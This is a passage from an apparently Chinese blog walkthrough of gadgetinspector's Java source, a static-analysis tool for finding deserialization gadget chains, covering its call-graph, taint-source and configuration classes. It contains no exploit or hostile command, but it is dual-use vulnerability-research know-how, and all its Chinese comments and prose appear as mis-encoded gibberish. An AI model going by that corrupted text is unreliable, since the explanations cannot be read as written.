Set&lt;MethodReference.Handle&gt; methods = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();  <span class="comment">// å­˜å‚¨æ–¹æ³•</span></span><br><span class="line">                methods.add(method);</span><br><span class="line">                methodsByClass.put(classReference, methods);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                methodsByClass.get(classReference).add(method); <span class="comment">// æ·»åŠ æ–¹æ³•</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// å­˜å‚¨ç»§æ‰¿å…³ç³»ï¼Œçˆ¶ç±»-&gt;å­ç±»é›†åˆ</span></span><br><span class="line">        Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; subClassMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; entry : inheritanceMap.entrySet()) &#123;</span><br><span class="line">            <span class="comment">// ä» å­ç±»-&gt;çˆ¶ç±»é›†åˆ ä¸­å–å‡ºçˆ¶ç±»</span></span><br><span class="line">            <span class="keyword">for</span> (ClassReference.Handle parent : entry.getValue()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!subClassMap.containsKey(parent)) &#123; <span class="comment">// é¿å…é‡å¤</span></span><br><span class="line">                    Set&lt;ClassReference.Handle&gt; subClasses = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();    <span class="comment">// å­˜å‚¨å­ç±»</span></span><br><span class="line">                    subClasses.add(entry.getKey());</span><br><span class="line">                    subClassMap.put(parent, subClasses);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    subClassMap.get(parent).add(entry.getKey());    <span class="comment">// æ·»åŠ å­ç±»</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æŸ¥æ‰¾é‡å†™æ–¹æ³•</span></span><br><span class="line">        Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// éå†æ–¹æ³•é›†åˆ</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference method : methodMap.values()) &#123;</span><br><span class="line">            <span class="comment">// Static methods cannot be overriden</span></span><br><span class="line">            <span class="keyword">if</span> (method.isStatic()) &#123;    <span class="comment">// é™æ€æ–¹æ³•ä¸èƒ½è¢«é‡å†™</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å­˜å‚¨é‡å†™æ–¹æ³•</span></span><br><span class="line">            Set&lt;MethodReference.Handle&gt; overridingMethods = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">            Set&lt;ClassReference.Handle&gt; subClasses = subClassMap.get(method.getClassReference());    <span class="comment">// æ–¹æ³•æ‰€å±ç±»çš„å­ç±»é›†åˆ</span></span><br><span class="line">            <span class="keyword">if</span> (subClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// éå†å­ç±»</span></span><br><span class="line">                <span class="keyword">for</span> (ClassReference.Handle subClass : subClasses) &#123;</span><br><span class="line">                    <span class="comment">// This class extends ours; see if it has a matching method</span></span><br><span class="line">                    Set&lt;MethodReference.Handle&gt; subClassMethods = methodsByClass.get(subClass); <span class="comment">// ç±»çš„æ–¹æ³•é›†åˆ</span></span><br><span class="line">                    <span class="keyword">if</span> (subClassMethods != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">for</span> (MethodReference.Handle subClassMethod : subClassMethods) &#123;</span><br><span class="line">                            <span class="comment">// åˆ¤æ–­æ–¹æ³•åç§°å’Œæè¿°ç¬¦æ˜¯å¦ç›¸ç­‰</span></span><br><span class="line">                            <span class="keyword">if</span> (subClassMethod.getName().equals(method.getName()) &amp;&amp; subClassMethod.getDesc().equals(method.getDesc())) &#123;</span><br><span class="line">                                overridingMethods.add(subClassMethod);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å¦‚æœå­˜åœ¨é‡å†™æ–¹æ³•ï¼Œåˆ™ä¿å­˜åˆ° methodImplMap ä¸­</span></span><br><span class="line">            <span class="keyword">if</span> (overridingMethods.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                methodImplMap.put(method.getHandle(), overridingMethods);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> methodImplMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-GraphCall"><a href="#7-GraphCall" class="headerlink" title="7. GraphCall"></a>7. GraphCall</h3><p>å®šä¹‰æ±¡ç‚¹åœ¨<strong>è°ƒç”¨å…³ç³»</strong>ä¸­çš„ä¼ é€’ä¿¡æ¯ï¼ŒæŒ‡çš„æ˜¯è¢«è°ƒç”¨æ–¹æ³•çš„å‚æ•°å—è°ƒç”¨è€…æ–¹æ³•çš„å‚æ•°å½±å“ï¼Œä½¿ç”¨ asm è®¿é—®è€…è®°å½•ï¼Œæ¶‰åŠæ¨¡æ‹Ÿ JVM çš„ä¸€äº›æ“ä½œï¼Œå…·ä½“å®ç°åœ¨ <code>CallGraphDiscovery</code> ç±»ä¸­ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GraphCall</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MethodReference.Handle callerMethod;  <span class="comment">// è°ƒç”¨è€…ï¼ˆæ–¹æ³•ï¼‰</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MethodReference.Handle targetMethod;  <span class="comment">// è¢«è°ƒç”¨è€…ï¼ˆæ–¹æ³•ï¼‰</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> callerArgIndex;   <span class="comment">// è°ƒç”¨è€…ï¼ˆæ–¹æ³•ï¼‰çš„å‚æ•°ç´¢å¼•</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String callerArgPath; <span class="comment">// å‚æ•°å¯¹è±¡çš„å“ªä¸ªå­—æ®µè¢«ä¼ é€’</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> targetArgIndex;   <span class="comment">// è¢«è°ƒç”¨è€…ï¼ˆæ–¹æ³•ï¼‰çš„å‚æ•°ç´¢å¼•</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">GraphCall</span><span class="params">(MethodReference.Handle callerMethod, MethodReference.Handle targetMethod, <span class="type">int</span> callerArgIndex, String callerArgPath, <span class="type">int</span> targetArgIndex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.callerMethod = callerMethod;</span><br><span class="line">        <span class="built_in">this</span>.targetMethod = targetMethod;</span><br><span class="line">        <span class="built_in">this</span>.callerArgIndex = callerArgIndex;</span><br><span class="line">        <span class="built_in">this</span>.callerArgPath = callerArgPath;</span><br><span class="line">        <span class="built_in">this</span>.targetArgIndex = targetArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> MethodReference.Handle <span class="title function_">getCallerMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> callerMethod;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> MethodReference.Handle <span class="title function_">getTargetMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> targetMethod;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCallerArgIndex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> callerArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCallerArgPath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> callerArgPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getTargetArgIndex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> targetArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;   <span class="comment">// æ¯”è¾ƒæ–¹æ³•</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == o) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="literal">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">GraphCall</span> <span class="variable">graphCall</span> <span class="operator">=</span> (GraphCall) o;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (callerArgIndex != graphCall.callerArgIndex) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (targetArgIndex != graphCall.targetArgIndex) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (callerMethod != <span class="literal">null</span> ? !callerMethod.equals(graphCall.callerMethod) : graphCall.callerMethod != <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (targetMethod != <span class="literal">null</span> ? !targetMethod.equals(graphCall.targetMethod) : graphCall.targetMethod != <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> callerArgPath != <span class="literal">null</span> ? callerArgPath.equals(graphCall.callerArgPath) : graphCall.callerArgPath == <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123; <span class="comment">// å­˜å‚¨åˆ°é”®å€¼æ•°æ®æ ¼å¼ä¸­è°ƒç”¨çš„æ¯”è¾ƒæ–¹æ³•</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> callerMethod != <span class="literal">null</span> ? callerMethod.hashCode() : <span class="number">0</span>;</span><br><span class="line">        result = <span class="number">31</span> * result + (targetMethod != <span class="literal">null</span> ? targetMethod.hashCode() : <span class="number">0</span>);</span><br><span class="line">        result = <span class="number">31</span> * result + callerArgIndex;</span><br><span class="line">        result = <span class="number">31</span> * result + (callerArgPath != <span class="literal">null</span> ? callerArgPath.hashCode() : <span class="number">0</span>);</span><br><span class="line">        result = <span class="number">31</span> * result + targetArgIndex;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰è¯»å†™æ ¼å¼ï¼š<code>çˆ¶ç±»ï¼Œçˆ¶æ–¹æ³•ï¼Œçˆ¶æ–¹æ³•æè¿°ç¬¦ï¼Œå­ç±»ï¼Œè¢«è°ƒæ–¹æ³•ï¼Œè¢«è°ƒæ–¹æ³•æè¿°ï¼Œçˆ¶æ–¹æ³•å‚æ•°ç´¢å¼•ï¼Œçˆ¶æ–¹æ³•å‚æ•°åï¼Œè¢«è°ƒæ–¹æ³•å‚æ•°ç´¢å¼•</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Factory</span> <span class="keyword">implements</span> <span class="title class_">DataFactory</span>&lt;GraphCall&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> GraphCall <span class="title function_">parse</span><span class="params">(String[] fields)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">GraphCall</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>]),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(fields[<span class="number">3</span>]), fields[<span class="number">4</span>], fields[<span class="number">5</span>]),</span><br><span class="line">                Integer.parseInt(fields[<span class="number">6</span>]),</span><br><span class="line">                fields[<span class="number">7</span>],</span><br><span class="line">                Integer.parseInt(fields[<span class="number">8</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(GraphCall obj) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">                obj.callerMethod.getClassReference().getName(), obj.callerMethod.getName(), obj.callerMethod.getDesc(),</span><br><span class="line">                obj.targetMethod.getClassReference().getName(), obj.targetMethod.getName(), obj.targetMethod.getDesc(),</span><br><span class="line">                Integer.toString(obj.callerArgIndex),</span><br><span class="line">                obj.callerArgPath,</span><br><span class="line">                Integer.toString(obj.targetArgIndex),</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-Source"><a href="#8-Source" class="headerlink" title="8. Source"></a>8. Source</h3><p>å®šä¹‰<strong>æ±¡ç‚¹æºä¿¡æ¯</strong>çš„æè¿°æ–¹å¼ï¼Œç”±å®ç°äº†æŠ½è±¡ç±» <code>SourceDiscovery</code> çš„ç±»æœç´¢å’Œè®°å½•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Source</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MethodReference.Handle sourceMethod;  <span class="comment">// æ‰€å±æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> taintedArgIndex;                  <span class="comment">// ä¼ é€’æ±¡ç‚¹çš„å‚æ•°ç´¢å¼•</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Source</span><span class="params">(MethodReference.Handle sourceMethod, <span class="type">int</span> taintedArgIndex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sourceMethod = sourceMethod;</span><br><span class="line">        <span class="built_in">this</span>.taintedArgIndex = taintedArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> MethodReference.Handle <span class="title function_">getSourceMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sourceMethod;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getTaintedArgIndex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> taintedArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰<strong>æ±¡ç‚¹æºä¿¡æ¯</strong>çš„è¯»å†™æ ¼å¼ï¼š<code>ç±»å æ–¹æ³•å æ–¹æ³•æè¿°ç¬¦ å‚æ•°ç´¢å¼•</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Factory</span> <span class="keyword">implements</span> <span class="title class_">DataFactory</span>&lt;Source&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Source <span class="title function_">parse</span><span class="params">(String[] fields)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Source</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>]),</span><br><span class="line">                Integer.parseInt(fields[<span class="number">3</span>])</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String[] serialize(Source obj) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">                obj.sourceMethod.getClassReference().getName(), obj.sourceMethod.getName(), obj.sourceMethod.getDesc(),</span><br><span class="line">                Integer.toString(obj.taintedArgIndex),</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="gadgetinspector"><a href="#gadgetinspector" class="headerlink" title="gadgetinspector"></a>gadgetinspector</h2><p>å®ç°æ£€æµ‹éœ€è¦å®ç°çš„æŠ½è±¡ç±»å’Œæ¥å£ï¼Œå…¶ä»–ç±»çš„è§£ææ”¾åˆ° <strong>0x03 å·¥ä½œæµç¨‹</strong> ä¸€èŠ‚ã€‚</p><h3 id="1-SerializableDecider"><a href="#1-SerializableDecider" class="headerlink" title="1. SerializableDecider"></a>1. SerializableDecider</h3><p>åºåˆ—åŒ–å†³ç­–è€…æ¥å£ï¼Œåˆ¤æ–­ç±»æ˜¯å¦å¯åºåˆ—åŒ–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Represents logic to decide if a class is serializable. The simple case (implemented by</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> SimpleSerializableDecider&#125;) just checks if the class implements serializable. Other use-cases may have more</span></span><br><span class="line"><span class="comment"> * complicated logic.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SerializableDecider</span> <span class="keyword">extends</span> <span class="title class_">Function</span>&lt;ClassReference.Handle, Boolean&gt; &#123; <span class="comment">// åºåˆ—åŒ–å†³ç­–è€…</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-ImplementationFinder"><a href="#2-ImplementationFinder" class="headerlink" title="2. ImplementationFinder"></a>2. ImplementationFinder</h3><p>æ¥å£ï¼Œç”¨äºæŸ¥æ‰¾å¯åºåˆ—åŒ–çš„é‡å†™æ–¹æ³•ï¼Œå³åˆ¤æ–­æ–¹æ³•æ‰€å±ç±»æ˜¯å¦å¯åºåˆ—åŒ–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ImplementationFinder</span> &#123;</span><br><span class="line">    Set&lt;MethodReference.Handle&gt; getImplementations(MethodReference.Handle target); <span class="comment">// æŸ¥æ‰¾å¯åºåˆ—åŒ–çš„é‡å†™æ–¹æ³•</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-SourceDiscovery"><a href="#3-SourceDiscovery" class="headerlink" title="3. SourceDiscovery"></a>3. SourceDiscovery</h3><p>æŠ½è±¡ç±»ï¼Œå®ç°äº†æ±¡ç‚¹æºä¿¡æ¯çš„å­˜å‚¨æ–¹æ³•ï¼Œå­ç±»éœ€è¦å®ç°æ±¡ç‚¹æºçš„å…·ä½“æŸ¥æ‰¾æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">SourceDiscovery</span> &#123; <span class="comment">// æŠ½è±¡ç±»</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¿å­˜æ‰¾åˆ°çš„æ±¡ç‚¹æº</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Source&gt; discoveredSources = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æ·»åŠ æ±¡ç‚¹æº</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> source æ±¡ç‚¹</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">addDiscoveredSource</span><span class="params">(Source source)</span> &#123;</span><br><span class="line">        discoveredSources.add(source);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æŸ¥æ‰¾æ±¡ç‚¹æº</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">discover</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// åŠ è½½ç±»ä¿¡æ¯</span></span><br><span class="line">        Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();</span><br><span class="line">        <span class="comment">// åŠ è½½å‡½æ•°ä¿¡æ¯</span></span><br><span class="line">        Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">        <span class="comment">// åŠ è½½ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line">        <span class="type">InheritanceMap</span> <span class="variable">inheritanceMap</span> <span class="operator">=</span> InheritanceMap.load();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è°ƒç”¨å®ç°ç±»çš„ discover æ–¹æ³•</span></span><br><span class="line">        discover(classMap, methodMap, inheritanceMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * æŠ½è±¡æ–¹æ³• -&gt; å…·ä½“å®ç°</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classMap       ç±»ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> methodMap      æ–¹æ³•ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inheritanceMap ç»§æ‰¿ä¿¡æ¯</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">discover</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span><br><span class="line"><span class="params">                                  Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span><br><span class="line"><span class="params">                                  InheritanceMap inheritanceMap)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ä½¿ç”¨å·¥å‚æ–¹æ³•å­˜å‚¨æ±¡ç‚¹æºä¿¡æ¯</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        DataLoader.saveData(Paths.get(<span class="string">&quot;sources.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">Source</span>.Factory(), discoveredSources);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="gadgetinspector-x2F-config"><a href="#gadgetinspector-x2F-config" class="headerlink" title="gadgetinspector&#x2F;config"></a>gadgetinspector&#x2F;config</h2><p>å®šä¹‰é…ç½®ã€‚</p><h3 id="1-GIConfig"><a href="#1-GIConfig" class="headerlink" title="1. GIConfig"></a>1. GIConfig</h3><p>é…ç½®æ¥å£ï¼Œæ‰€æœ‰æ£€æµ‹å®ç°éƒ½å¿…é¡»å®ç°è¯¥æ¥å£ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">GIConfig</span> &#123;</span><br><span class="line">    <span class="comment">// é…ç½®åç§°</span></span><br><span class="line">    String <span class="title function_">getName</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åºåˆ—åŒ–å†³ç­–è€…</span></span><br><span class="line">    SerializableDecider 